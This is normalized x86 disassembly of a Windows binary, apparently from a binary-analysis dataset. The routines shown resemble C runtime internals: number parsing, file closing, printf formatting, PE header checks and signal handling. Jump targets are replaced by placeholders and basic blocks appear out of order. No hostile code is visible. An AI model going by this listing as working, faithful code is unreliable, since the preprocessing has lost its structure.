mov eax [ ebp - 0x4 ]
cmp edx ecx
jae r-xdata
push 0x41
pop eax
cmp ax di
ja r-xdata
movzx eax [ esi ]
push 0x78
pop ecx
cmp ax cx
je r-xdata
push 0x10
pop eax
mov [ ebp + 0x10 ] eax
push 0x58
pop ecx
cmp ax cx
je r-xdata
mov edi [ ebp + 0xc ]
mov edi [ ebp - 0x8 ]
or eax 0x8
mov [ ebp - 0x4 ] eax
cmp ebx edi
jb r-xdata
push 0x19
lea eax [ edi - 0x61 ]
pop ecx
cmp ax cx
jbe r-xdata
cmp di 0x5a
jbe r-xdata
movzx edi [ esi + 0x2 ]
add esi 0x4
push 0x58
pop ecx
cmp ax cx
jne r-xdata
mov [ ebp + 0x10 ] 0x8
jmp r-xdata
test al 0x4
jne r-xdata
test edi edi
je r-xdata
imul ebx ecx
add ebx edx
jne r-xdata
lea eax [ edi - 0x61 ]
movzx edx di
cmp ax cx
ja r-xdata
mov eax [ ebp - 0x4 ]
push 0x19
pop ecx
call sub_41ccf1
mov [ eax ] 0x22
mov eax [ ebp - 0x4 ]
test al 0x1
je r-xdata
test al 0x1
jne r-xdata
xor ebx ebx
jmp r-xdata
mov esi [ ebp + 0x8 ]
push edi
call sub_42a5de
mov edx eax
pop ecx
cmp edx 0xffffffff
jne r-xdata
mov edi [ ebp + 0xc ]
or eax 0x4
mov [ ebp - 0x4 ] eax
test edi edi
je r-xdata
cmp edx [ ebp - 0xc ]
jbe r-xdata
add edx 0xffffffc9
sub edx 0x20
push 0x0
test al 0x2
pop ebx
setne bl
add ebx 0x7fffffff
or ebx 0xffffffff
jmp r-xdata
test edi edi
je r-xdata
mov ecx eax
and ecx 0x2
je r-xdata
sub esi 0x2
test al 0x8
jne r-xdata
jmp r-xdata
test al 0x2
je r-xdata
mov [ edi ] esi
test ecx ecx
jne r-xdata
cmp ebx 0x80000000
ja r-xdata
movzx edi [ esi ]
add esi 0x2
jmp r-xdata
pop edi
pop esi
mov eax ebx
pop ebx
leave
retn
neg ebx
cmp ebx 0x7fffffff
jbe r-xdata
sub_4222ad
push 0x10
push r--data
call sub_41ecb0
mov esi [ ebp + 0x8 ]
cmp esi 0xfffffffe
jne r-xdata
test esi esi
js r-xdata
call sub_41ccbd
and [ eax ] 0x0
call sub_41ccf1
mov [ eax ] 0x9
jmp r-xdata
call sub_41ccbd
and [ eax ] 0x0
call sub_41ccf1
mov [ eax ] 0x9
call sub_41f411
cmp esi [ rw-data ]
jae r-xdata
or eax 0xffffffff
mov ebx esi
sar ebx 0x5
mov edi esi
and edi 0x1f
shl edi 0x6
mov eax [ ebx * 4 + rw-data ]
movsx eax [ eax + edi + 0x4 ]
and eax 0x1
je r-xdata
push esi
call sub_42a185
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ ebx * 4 + rw-data ]
test [ eax + edi + 0x4 ] 0x1
je r-xdata
call sub_41ccf1
mov [ eax ] 0x9
or edi 0xffffffff
push esi
call sub_422377
pop ecx
mov edi eax
jmp r-xdata
call sub_41ecf5
retn
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_42234e
mov eax edi
jmp r-xdata
sub_422377
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
push edi
call sub_42a43c
pop ecx
cmp eax 0xffffffff
je r-xdata
xor esi esi
mov eax [ rw-data ]
cmp edi 0x1
jne r-xdata
xor eax eax
push esi
call sub_41ccd0
pop ecx
or eax 0xffffffff
jmp r-xdata
cmp edi 0x2
jne r-xdata
test [ eax + 0x84 ] 0x1
jne r-xdata
pop edi
pop esi
pop ebp
retn
push edi
call sub_42a43c
pop ecx
push eax
call [ CloseHandle@IAT ]
test eax eax
jne r-xdata
test [ eax + 0x44 ] 0x1
je r-xdata
push 0x2
call sub_42a43c
push 0x1
mov esi eax
call sub_42a43c
pop ecx
pop ecx
cmp eax esi
je r-xdata
call [ GetLastError@IAT ]
mov esi eax
jmp r-xdata
push edi
call sub_42a3b6
pop ecx
mov ecx edi
sar ecx 0x5
and edi 0x1f
mov ecx [ ecx * 4 + rw-data ]
shl edi 0x6
mov [ ecx + edi + 0x4 ] 0x0
test esi esi
je r-xdata
sub_422411
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test [ esi + 0xc ] 0x83
je r-xdata
pop esi
pop ebp
retn
test [ esi + 0xc ] 0x8
je r-xdata
push [ esi + 0x8 ]
call sub_417912
and [ esi + 0xc ] 0xfffffbf7
xor eax eax
pop ecx
mov [ esi ] eax
mov [ esi + 0x8 ] eax
mov [ esi + 0x4 ] eax
sub_422441
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
je r-xdata
pop ebp
retn
push esi
mov esi [ ebp + 0xc ]
test [ esi + 0xc ] 0x1000
je r-xdata
pop esi
push esi
call sub_41966b
and [ esi + 0xc ] 0xffffeeff
xor eax eax
pop ecx
mov [ esi + 0x18 ] eax
mov [ esi ] eax
mov [ esi + 0x8 ] eax
sub_422472
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push esi
call sub_42094c
push eax
call sub_4290d7
pop ecx
pop ecx
test eax eax
je r-xdata
pop esi
pop ebp
retn
push edi
call sub_419282
add eax 0x20
cmp esi eax
jne r-xdata
call sub_419282
add eax 0x40
cmp esi eax
jne r-xdata
xor edi edi
jmp r-xdata
xor eax eax
xor edi edi
inc edi
inc [ rw-data ]
test [ esi + 0xc ] 0x10c
jne r-xdata
cmp [ edi * 4 + rw-data ] 0x0
push ebx
mov ebx 0x1000
jne r-xdata
mov ecx [ edi * 4 + rw-data ]
mov [ esi + 0x8 ] ecx
mov [ esi ] ecx
mov [ esi + 0x18 ] ebx
mov [ esi + 0x4 ] ebx
push ebx
call sub_41b8d1
pop ecx
mov [ edi * 4 + rw-data ] eax
test eax eax
jne r-xdata
pop edi
lea eax [ esi + 0x14 ]
push 0x2
mov [ esi + 0x8 ] eax
mov [ esi ] eax
pop eax
mov [ esi + 0x18 ] eax
mov [ esi + 0x4 ] eax
jmp r-xdata
or [ esi + 0xc ] 0x1102
xor eax eax
inc eax
pop ebx
jmp r-xdata
sub_422518
push ebp
mov ebp esp
sub esp 0x280
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
mov esi [ ebp + 0xc ]
push edi
mov edi [ ebp + 0x14 ]
push [ ebp + 0x10 ]
mov [ ebp - 0x230 ] eax
xor eax eax
mov ebx eax
lea ecx [ ebp - 0x278 ]
mov [ ebp - 0x210 ] esi
mov [ ebp - 0x21c ] edi
mov [ ebp - 0x250 ] eax
mov [ ebp - 0x218 ] ebx
mov [ ebp - 0x238 ] eax
mov [ ebp - 0x228 ] eax
mov [ ebp - 0x234 ] eax
mov [ ebp - 0x248 ] eax
mov [ ebp - 0x23c ] eax
call sub_4199d2
call sub_41ccf1
mov [ ebp - 0x254 ] eax
mov eax [ ebp - 0x230 ]
test eax eax
je r-xdata
call sub_41ccf1
mov [ eax ] 0x16
call sub_41f411
or eax 0xffffffff
jmp r-xdata
test [ eax + 0xc ] 0x40
jne r-xdata
cmp [ ebp - 0x26c ] 0x0
pop edi
pop esi
pop ebx
je r-xdata
test esi esi
je r-xdata
push eax
call sub_42094c
pop ecx
mov ecx eax
cmp ecx 0xffffffff
je r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_4170bc
leave
retn
mov ecx [ ebp - 0x270 ]
and [ ecx + 0x70 ] 0xfffffffd
mov cl [ esi ]
xor eax eax
mov edx eax
mov [ ebp - 0x220 ] edx
mov [ ebp - 0x224 ] eax
mov [ ebp - 0x244 ] eax
mov [ ebp - 0x258 ] eax
mov [ ebp - 0x211 ] cl
mov [ ebp - 0x24c ] cl
test cl cl
je r-xdata
mov edx rw-data
cmp ecx 0xfffffffe
je r-xdata
mov eax edx
mov esi [ ebp - 0x264 ]
mov eax [ ebp - 0x210 ]
cmp ecx 0xffffffff
je r-xdata
mov edx ecx
and edx 0x1f
sar eax 0x5
shl edx 0x6
add edx [ eax * 4 + rw-data ]
jmp r-xdata
lea eax [ ecx - 0x20 ]
cmp al 0x58
ja r-xdata
mov ecx rw-data
cmp ecx 0xfffffffe
je r-xdata
test [ edx + 0x24 ] 0x7f
jne r-xdata
xor eax eax
movsx eax cl
movsx eax [ eax + r--data ]
and eax 0xf
jmp r-xdata
mov eax ecx
and ecx 0x1f
sar eax 0x5
shl ecx 0x6
add ecx [ eax * 4 + rw-data ]
jmp r-xdata
mov eax [ ebp - 0x210 ]
jmp [ eax * 4 + jump_table_423080 ]
mov edi [ ebp - 0x244 ]
movsx edi [ edi + eax * 8 + r--data ]
mov eax edi
sar eax 0x4
mov [ ebp - 0x244 ] edi
mov edi [ ebp - 0x21c ]
mov [ ebp - 0x244 ] eax
cmp eax 0x7
ja r-xdata
test [ ecx + 0x24 ] 0x80
jne r-xdata
inc eax
mov [ ebp - 0x210 ] eax
test edx edx
js r-xdata
xor eax eax
or [ ebp - 0x228 ] 0xffffffff
mov ebx eax
mov [ ebp - 0x260 ] eax
mov [ ebp - 0x248 ] eax
mov [ ebp - 0x238 ] eax
mov [ ebp - 0x234 ] eax
mov [ ebp - 0x218 ] ebx
mov [ ebp - 0x23c ] eax
jmp r-xdata
movsx eax cl
sub eax 0x20
je r-xdata
cmp cl 0x2a
jne r-xdata
xor eax eax
mov [ ebp - 0x228 ] eax
jmp r-xdata
cmp cl 0x2a
jne r-xdata
cmp cl 0x49
je r-xdata
xor eax eax
movsx eax cl
cmp eax 0x64
jg r-xdata
or ebx 0x2
jmp r-xdata
sub eax 0x3
je r-xdata
mov eax [ ebp - 0x238 ]
imul eax eax 0xa
mov [ ebp - 0x238 ] eax
movsx eax cl
mov ecx [ ebp - 0x238 ]
add ecx 0xffffffd0
add ecx eax
mov [ ebp - 0x238 ] ecx
jmp r-xdata
mov eax [ edi ]
add edi 0x4
mov [ ebp - 0x21c ] edi
mov [ ebp - 0x238 ] eax
test eax eax
jns r-xdata
mov edx [ ebp - 0x228 ]
imul edx edx 0xa
movsx eax cl
add edx 0xffffffd0
add edx eax
mov [ ebp - 0x228 ] edx
jmp r-xdata
mov eax [ edi ]
add edi 0x4
mov [ ebp - 0x228 ] eax
test eax eax
mov eax [ ebp - 0x210 ]
mov [ ebp - 0x21c ] edi
jns r-xdata
mov eax [ ebp - 0x210 ]
mov al [ eax ]
cmp al 0x36
jne r-xdata
cmp cl 0x68
je r-xdata
lea eax [ ebp - 0x220 ]
push eax
push [ ebp - 0x230 ]
push [ ebp - 0x24c ]
call sub_4230a0
add esp 0xc
jmp r-xdata
lea eax [ ebp - 0x220 ]
push eax
push [ ebp - 0x230 ]
push [ ebp - 0x24c ]
call sub_4230a0
mov ecx [ ebp - 0x210 ]
add esp 0xc
mov al [ ecx ]
inc ecx
mov [ ebp - 0x24c ] al
mov [ ebp - 0x210 ] ecx
test al al
je r-xdata
cmp eax 0x70
jg r-xdata
je r-xdata
mov [ ebp - 0x218 ] ebx
jmp r-xdata
or ebx 0x80
jmp r-xdata
sub eax 0x8
je r-xdata
or ebx 0x4
neg eax
mov [ ebp - 0x218 ] ebx
mov [ ebp - 0x238 ] eax
jmp r-xdata
mov edx [ ebp - 0x220 ]
mov cl [ eax ]
mov [ ebp - 0x211 ] cl
mov [ ebp - 0x24c ] cl
test cl cl
jne r-xdata
or [ ebp - 0x228 ] 0xffffffff
jmp r-xdata
cmp al 0x33
jne r-xdata
mov edi [ ebp - 0x210 ]
cmp [ edi + 0x1 ] 0x34
jne r-xdata
or ebx 0x20
jmp r-xdata
mov eax [ ebp - 0x210 ]
cmp cl 0x6c
je r-xdata
sub eax 0x73
je r-xdata
je r-xdata
or ebx 0x40
mov [ ebp - 0x218 ] ebx
cmp eax 0x53
jg r-xdata
or ebx 0x1
jmp r-xdata
dec eax
dec eax
je r-xdata
cmp al 0x64
je r-xdata
mov edi [ ebp - 0x210 ]
cmp [ edi + 0x1 ] 0x32
jne r-xdata
mov eax edi
add eax 0x2
or ebx 0x8000
jmp r-xdata
cmp [ eax ] 0x6c
jne r-xdata
cmp cl 0x77
jne r-xdata
mov edx [ ebp - 0x228 ]
mov ecx 0x7fffffff
cmp edx 0xffffffff
je r-xdata
dec eax
dec eax
je r-xdata
mov [ ebp - 0x228 ] 0x8
cmp eax 0x65
jl r-xdata
mov ecx [ edi ]
add edi 0x8
mov [ ebp - 0x21c ] edi
mov edi [ edi - 0x4 ]
xor esi esi
jmp r-xdata
test ebx 0x1000
je r-xdata
sub eax 0x58
je r-xdata
je r-xdata
or ebx 0x4
sub eax 0x3
mov eax [ ebp - 0x210 ]
jne r-xdata
cmp al 0x69
je r-xdata
mov eax edi
add eax 0x2
and ebx 0xffff7fff
jmp r-xdata
mov [ ebp - 0x218 ] ebx
jmp r-xdata
or ebx 0x10
jmp r-xdata
inc eax
or ebx 0x1000
jmp r-xdata
or ebx 0x800
jmp r-xdata
mov esi [ edi ]
add edi 0x4
mov [ ebp - 0x21c ] edi
test ebx 0x810
je r-xdata
mov ecx edx
mov [ ebp - 0x224 ] 0xa
sub eax 0x3
jne r-xdata
pop eax
mov [ ebp - 0x250 ] eax
mov [ ebp - 0x224 ] 0x10
test bl bl
jns r-xdata
cmp [ ebp - 0x248 ] 0x0
jne r-xdata
cmp eax 0x67
jle r-xdata
test bl 0x40
je r-xdata
add edi 0x4
xor esi esi
mov [ ebp - 0x21c ] edi
test bl 0x20
je r-xdata
push 0x7
jmp r-xdata
dec eax
dec eax
je r-xdata
test ebx 0x830
jne r-xdata
sub eax 0x41
je r-xdata
or ebx 0x8
cmp al 0x6f
je r-xdata
test esi esi
jne r-xdata
test esi esi
jne r-xdata
push 0x27
test ebx 0x8000
jne r-xdata
add al 0x51
mov [ ebp - 0x22c ] 0x30
mov [ ebp - 0x22b ] al
mov [ ebp - 0x234 ] 0x2
jmp r-xdata
mov edx [ ebp - 0x220 ]
test bl 0x40
je r-xdata
mov eax [ ebp - 0x228 ]
or ebx 0x40
mov edx 0x200
mov [ ebp - 0x218 ] ebx
lea esi [ ebp - 0x20c ]
mov [ ebp - 0x240 ] edx
test eax eax
jns r-xdata
cmp eax 0x69
je r-xdata
test ebx 0x9000
jne r-xdata
cmp edi esi
jg r-xdata
test bl 0x40
je r-xdata
test bl 0x40
je r-xdata
mov eax [ edi ]
add edi 0x4
mov [ ebp - 0x21c ] edi
test eax eax
je r-xdata
sub eax 0x7
je r-xdata
or ebx 0x800
mov [ ebp - 0x218 ] ebx
add cl 0x20
mov [ ebp - 0x260 ] 0x1
mov [ ebp - 0x211 ] cl
dec eax
dec eax
je r-xdata
cmp al 0x75
je r-xdata
mov eax esi
jmp r-xdata
mov esi [ rw-data ]
mov [ ebp - 0x23c ] 0x1
mov eax esi
test ecx ecx
je r-xdata
mov esi [ rw-data ]
push eax
call sub_417912
xor eax eax
pop ecx
mov [ ebp - 0x258 ] eax
mov edi [ ebp - 0x238 ]
sub edi [ ebp - 0x224 ]
mov eax [ ebp - 0x234 ]
sub edi eax
test bl 0xc
jne r-xdata
test ebx 0x100
je r-xdata
jne r-xdata
mov [ ebp - 0x228 ] 0x6
jmp r-xdata
cmp eax 0x6e
je r-xdata
mov edx [ ebp - 0x228 ]
test edx edx
jns r-xdata
mov edi esi
jl r-xdata
mov ecx [ edi - 0x4 ]
mov edi esi
mov eax [ edi - 0x4 ]
movzx eax [ edi - 0x4 ]
jmp r-xdata
movsx eax [ edi - 0x4 ]
jmp r-xdata
mov esi [ rw-data ]
mov esi [ eax + 0x4 ]
test esi esi
je r-xdata
dec eax
dec eax
jne r-xdata
test ebx 0x830
jne r-xdata
dec eax
dec eax
je r-xdata
cmp al 0x78
je r-xdata
test ecx ecx
jne r-xdata
sub eax esi
sar eax 0x1
jmp r-xdata
xor edx edx
push [ ebp - 0x254 ]
lea ecx [ ebp - 0x220 ]
push ecx
push [ ebp - 0x230 ]
push eax
lea eax [ ebp - 0x22c ]
push eax
call sub_423112
add esp 0x14
test bl 0x8
je r-xdata
lea eax [ ebp - 0x220 ]
push eax
push [ ebp - 0x230 ]
push edi
push 0x20
call sub_4230e6
mov eax [ ebp - 0x234 ]
add esp 0x10
test bl 0x1
je r-xdata
mov [ ebp - 0x22c ] 0x2d
jmp r-xdata
cmp eax edx
jle r-xdata
cmp cl 0x67
jne r-xdata
mov eax [ edi ]
add edi 0x8
mov [ ebp - 0x280 ] eax
mov eax [ edi - 0x4 ]
mov [ ebp - 0x27c ] eax
lea eax [ ebp - 0x278 ]
push eax
push [ ebp - 0x260 ]
movsx eax cl
push [ ebp - 0x228 ]
mov [ ebp - 0x21c ] edi
push eax
push [ ebp - 0x240 ]
lea eax [ ebp - 0x280 ]
push esi
push eax
push [ rw-data ]
call [ DecodePointer@IAT ]
call eax
mov edi ebx
add esp 0x1c
and edi 0x80
je r-xdata
add edi 0x4
mov [ ebp - 0x21c ] edi
mov edi [ edi - 0x4 ]
call sub_418531
test eax eax
je r-xdata
cmp eax 0x6f
jne r-xdata
and ebx 0xfffffff7
mov eax 0x200
mov [ ebp - 0x218 ] ebx
cmp edx eax
jle r-xdata
xor edx edx
inc edx
jmp r-xdata
neg ecx
adc edi esi
neg edi
or ebx 0x100
mov [ ebp - 0x218 ] ebx
cmp ecx esi
jae r-xdata
cdq
mov ecx eax
mov edi edx
jmp r-xdata
mov [ ebp - 0x224 ] eax
movsx eax [ eax ]
test ebx 0x800
je r-xdata
add edi 0x4
mov [ ebp - 0x21c ] edi
test ebx 0x810
je r-xdata
or ebx 0x800
mov [ ebp - 0x218 ] ebx
jmp r-xdata
dec eax
dec eax
jne r-xdata
cmp al 0x58
je r-xdata
dec ecx
cmp [ eax ] 0x0
je r-xdata
sub eax esi
add eax 0x2
test ecx ecx
jne r-xdata
cmp [ ebp - 0x23c ] 0x0
mov eax [ ebp - 0x224 ]
je r-xdata
test bl 0x4
jne r-xdata
test bl 0x2
je r-xdata
mov [ ebp - 0x22c ] 0x2b
jmp r-xdata
mov [ ebp - 0x234 ] 0x1
cmp eax 0xa3
jle r-xdata
mov eax edx
mov [ ebp - 0x228 ] eax
mov [ ebp - 0x228 ] 0x1
jmp r-xdata
cmp [ ebp - 0x211 ] 0x67
jne r-xdata
cmp [ ebp - 0x228 ] 0x0
jne r-xdata
mov eax [ ebp - 0x220 ]
test bl 0x20
je r-xdata
mov [ ebp - 0x224 ] 0x8
test bl bl
jns r-xdata
mov eax ecx
or eax edi
jne r-xdata
mov edx eax
xor ecx ecx
mov [ ebp - 0x23c ] ecx
jmp r-xdata
cdq
sub eax edx
sar eax 0x1
mov [ ebp - 0x23c ] 0x1
jmp r-xdata
mov al [ edi - 0x4 ]
mov [ ebp - 0x20c ] al
mov [ ebp - 0x224 ] 0x1
movzx eax [ edi - 0x4 ]
push eax
push 0x200
lea eax [ ebp - 0x20c ]
push eax
lea eax [ ebp - 0x224 ]
push eax
call sub_42a89f
add esp 0x10
test eax eax
je r-xdata
xor eax eax
mov [ ebp - 0x244 ] eax
jmp r-xdata
inc eax
dec ecx
cmp [ eax ] dx
je r-xdata
push [ ebp - 0x254 ]
lea ecx [ ebp - 0x220 ]
push ecx
push [ ebp - 0x230 ]
push eax
push esi
call sub_423112
add esp 0x14
test eax eax
jle r-xdata
lea eax [ ebp - 0x220 ]
push eax
push [ ebp - 0x230 ]
push edi
push 0x30
call sub_4230e6
add esp 0x10
mov [ ebp - 0x22c ] 0x20
lea edi [ eax + 0x15d ]
push edi
call sub_41b8d1
pop ecx
mov cl [ ebp - 0x211 ]
mov [ ebp - 0x258 ] eax
test eax eax
je r-xdata
cmp [ esi ] 0x2d
jne r-xdata
test edi edi
jne r-xdata
lea eax [ ebp - 0x278 ]
push eax
push esi
push [ rw-data ]
call [ DecodePointer@IAT ]
call eax
pop ecx
pop ecx
mov [ edi ] eax
mov [ edi ] ax
jmp r-xdata
or ebx 0x200
mov [ ebp - 0x218 ] ebx
jmp r-xdata
lea esi [ ebp - 0xd ]
mov [ ebp - 0x234 ] esi
lea esi [ ebp - 0x20c ]
jmp r-xdata
mov [ ebp - 0x248 ] 0x1
jmp r-xdata
mov [ ebp - 0x23c ] eax
lea eax [ ebp - 0x278 ]
push eax
movzx eax cl
push eax
call sub_427df7
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ ebp - 0x258 ]
test eax eax
je r-xdata
test bl 0x4
je r-xdata
mov ecx esi
mov [ ebp - 0x228 ] 0xa3
mov esi eax
mov [ ebp - 0x240 ] edi
jmp r-xdata
push esi
call sub_41a7f0
pop ecx
jmp r-xdata
or ebx 0x100
mov [ ebp - 0x218 ] ebx
inc esi
jmp r-xdata
lea eax [ ebp - 0x278 ]
push eax
push esi
push [ rw-data ]
call [ DecodePointer@IAT ]
call eax
pop ecx
pop ecx
mov [ ebp - 0x248 ] 0x1
jmp r-xdata
mov eax [ ebp - 0x224 ]
cdq
push edx
push eax
push edi
push ecx
call sub_42a0f0
add ecx 0x30
mov [ ebp - 0x264 ] ebx
mov [ ebp - 0x240 ] eax
mov edi edx
cmp ecx 0x39
jle r-xdata
mov eax ecx
or eax edi
je r-xdata
lea eax [ ebp - 0x220 ]
push eax
push [ ebp - 0x230 ]
push edi
push 0x20
call sub_4230e6
add esp 0x10
or edx 0xffffffff
mov [ ebp - 0x220 ] edx
jmp r-xdata
cmp [ ebp - 0x25c ] eax
je r-xdata
mov edi [ ebp - 0x21c ]
mov edx [ ebp - 0x228 ]
mov [ esi ] cl
mov ecx [ ebp - 0x240 ]
dec esi
jmp r-xdata
add ecx [ ebp - 0x250 ]
mov ebx [ ebp - 0x218 ]
lea eax [ ebp - 0xd ]
sub eax esi
inc esi
mov [ ebp - 0x224 ] eax
test ebx 0x200
je r-xdata
test edx edx
js r-xdata
push [ ebp - 0x254 ]
lea eax [ ebp - 0x220 ]
push eax
push [ ebp - 0x230 ]
lea eax [ ebp - 0xc ]
push [ ebp - 0x25c ]
push eax
call sub_423112
mov eax [ ebp - 0x240 ]
mov ecx [ ebp - 0x264 ]
add esp 0x14
test eax eax
jne r-xdata
mov eax edx
dec edx
mov [ ebp - 0x228 ] edx
test eax eax
jg r-xdata
test eax eax
je r-xdata
dec eax
mov [ ebp - 0x240 ] eax
movzx eax [ ecx ]
push eax
push 0x6
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x25c ]
add ecx 0x2
push eax
mov [ ebp - 0x264 ] ecx
call sub_42a89f
add esp 0x10
test eax eax
jne r-xdata
jmp r-xdata
dec esi
inc [ ebp - 0x224 ]
mov [ esi ] 0x30
jmp r-xdata
cmp [ esi ] 0x30
je r-xdata
mov edx [ ebp - 0x220 ]
sub_4230a0
push ebp
mov ebp esp
mov edx [ ebp + 0xc ]
test [ edx + 0xc ] 0x40
je r-xdata
dec [ edx + 0x4 ]
js r-xdata
cmp [ edx + 0x8 ] 0x0
je r-xdata
movsx eax [ ebp + 0x8 ]
push edx
push eax
call sub_41f952
pop ecx
pop ecx
mov eax [ edx ]
mov cl [ ebp + 0x8 ]
mov [ eax ] cl
inc [ edx ]
movzx eax cl
jmp r-xdata
mov eax [ ebp + 0x10 ]
inc [ eax ]
pop ebp
retn
mov eax [ ebp + 0x10 ]
or [ eax ] 0xffffffff
pop ebp
retn
cmp eax 0xffffffff
jne r-xdata
sub_4230e6
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0xc ]
test esi esi
jle r-xdata
pop esi
pop ebp
retn
push edi
mov edi [ ebp + 0x14 ]
pop edi
test esi esi
jg r-xdata
push edi
push [ ebp + 0x10 ]
dec esi
push [ ebp + 0x8 ]
call sub_4230a0
add esp 0xc
cmp [ edi ] 0xffffffff
je r-xdata
sub_423112
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x18 ]
push edi
mov edi [ ebp + 0x10 ]
mov eax [ esi ]
test [ edi + 0xc ] 0x40
mov [ ebp + 0x18 ] eax
je r-xdata
and [ esi ] 0x0
push ebx
mov ebx [ ebp + 0xc ]
test ebx ebx
jle r-xdata
cmp [ edi + 0x8 ] 0x0
jne r-xdata
mov [ esi ] eax
mov eax [ ebp + 0x14 ]
mov ecx [ ebp + 0x14 ]
mov eax [ ebp + 0xc ]
add [ ecx ] eax
jmp r-xdata
test ebx ebx
jg r-xdata
cmp [ esi ] 0x2a
jne r-xdata
pop edi
pop esi
pop ebp
retn
push eax
mov eax [ ebp + 0x8 ]
push edi
movzx eax [ eax ]
push eax
dec ebx
call sub_4230a0
mov eax [ ebp + 0x14 ]
add esp 0xc
inc [ ebp + 0x8 ]
cmp [ eax ] 0xffffffff
jne r-xdata
cmp [ esi ] 0x0
jne r-xdata
push eax
push edi
push 0x3f
call sub_4230a0
mov eax [ ebp + 0x14 ]
add esp 0xc
pop ebx
mov eax [ ebp + 0x18 ]
sub_42318a
push esi
push edi
mov esi r--data
mov edi r--data
jmp r-xdata
cmp esi edi
jb r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
pop edi
pop esi
retn
add esi 0x4
call eax
sub_4231aa
push esi
push edi
mov esi r--data
mov edi r--data
jmp r-xdata
cmp esi edi
jb r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
pop edi
pop esi
retn
add esi 0x4
call eax
sub_4231d0
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push ebx
mov ecx [ eax + 0x3c ]
add ecx eax
push esi
movzx eax [ ecx + 0x14 ]
movzx ebx [ ecx + 0x6 ]
add eax 0x18
xor edx edx
add eax ecx
push edi
test ebx ebx
je r-xdata
xor eax eax
mov edi [ ebp + 0xc ]
inc edx
add eax 0x28
cmp edx ebx
jb r-xdata
mov ecx [ eax + 0x8 ]
add ecx esi
cmp edi ecx
jb r-xdata
mov esi [ eax + 0xc ]
cmp edi esi
jb r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
sub_423220
push ebp
mov ebp esp
push 0xfffffffe
push r--data
push sub_41ed10
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor [ ebp - 0x8 ] eax
xor eax ebp
push eax
lea eax [ ebp - 0x10 ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x18 ] esp
mov [ ebp - 0x4 ] 0x0
push __dos_header
call sub_4232e0
add esp 0x4
test eax eax
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
xor eax eax
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0x8 ]
sub eax __dos_header
push eax
push __dos_header
call sub_4231d0
add esp 0x8
test eax eax
je r-xdata
mov eax [ eax + 0x24 ]
shr eax 0x1f
not eax
and eax 0x1
mov [ ebp - 0x4 ] 0xfffffffe
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4232e0
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx 0x5a4d
cmp [ eax ] cx
je r-xdata
mov ecx [ eax + 0x3c ]
add ecx eax
xor eax eax
cmp [ ecx ] 0x4550
jne r-xdata
xor eax eax
pop ebp
retn
pop ebp
retn
mov edx 0x10b
cmp [ ecx + 0x18 ] dx
sete al
sub_4233f6
push 0x24
push r--data
call sub_41ecb0
xor ebx ebx
mov [ ebp - 0x20 ] ebx
xor edi edi
mov [ ebp - 0x28 ] edi
mov esi [ ebp + 0x8 ]
cmp esi 0xb
jg r-xdata
mov eax esi
sub eax 0xf
je r-xdata
je r-xdata
mov [ ebp - 0x1c ] rw-data
mov eax [ rw-data ]
sub eax 0x6
je r-xdata
call sub_4246ee
mov edi eax
mov [ ebp - 0x28 ] edi
test edi edi
jne r-xdata
mov eax esi
push 0x2
pop ecx
sub eax ecx
je r-xdata
xor eax eax
test eax eax
jne r-xdata
mov [ ebp - 0x1c ] rw-data
mov eax [ rw-data ]
jmp r-xdata
dec eax
je r-xdata
push [ edi + 0x5c ]
push esi
call sub_4235ab
pop ecx
pop ecx
add eax 0x8
mov [ ebp - 0x1c ] eax
mov eax [ eax ]
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
mov [ ebp - 0x1c ] rw-data
mov eax [ rw-data ]
jmp r-xdata
sub eax ecx
je r-xdata
test ebx ebx
je r-xdata
push 0x3
call sub_4187b5
xor ebx ebx
inc ebx
mov [ ebp - 0x20 ] ebx
push eax
call [ DecodePointer@IAT ]
mov [ ebp - 0x1c ] rw-data
mov eax [ rw-data ]
jmp r-xdata
call sub_41ccf1
mov [ eax ] 0x16
call sub_41f411
jmp r-xdata
mov [ ebp - 0x24 ] eax
cmp eax 0x1
je r-xdata
call sub_41ecf5
retn
sub eax ecx
je r-xdata
and [ ebp - 0x4 ] 0x0
cmp esi 0x8
je r-xdata
push 0x0
call sub_41ad36
pop ecx
sub eax ecx
jne r-xdata
mov eax [ edi + 0x60 ]
mov [ ebp - 0x30 ] eax
and [ edi + 0x60 ] 0x0
cmp esi 0x8
jne r-xdata
cmp esi 0xb
je r-xdata
push 0x0
call [ EncodePointer@IAT ]
mov ecx [ ebp - 0x1c ]
mov [ ecx ] eax
mov eax [ edi + 0x64 ]
mov [ ebp - 0x34 ] eax
mov [ edi + 0x64 ] 0x8c
cmp esi 0x4
jne r-xdata
push esi
call [ ebp - 0x24 ]
push [ edi + 0x64 ]
push esi
call [ ebp - 0x24 ]
pop ecx
jmp r-xdata
mov ecx [ r--data ]
mov edx ecx
mov [ ebp - 0x2c ] edx
cmp esi 0x8
jne r-xdata
mov eax [ ebp - 0x30 ]
mov [ edi + 0x60 ] eax
cmp esi 0x8
jne r-xdata
cmp esi 0xb
je r-xdata
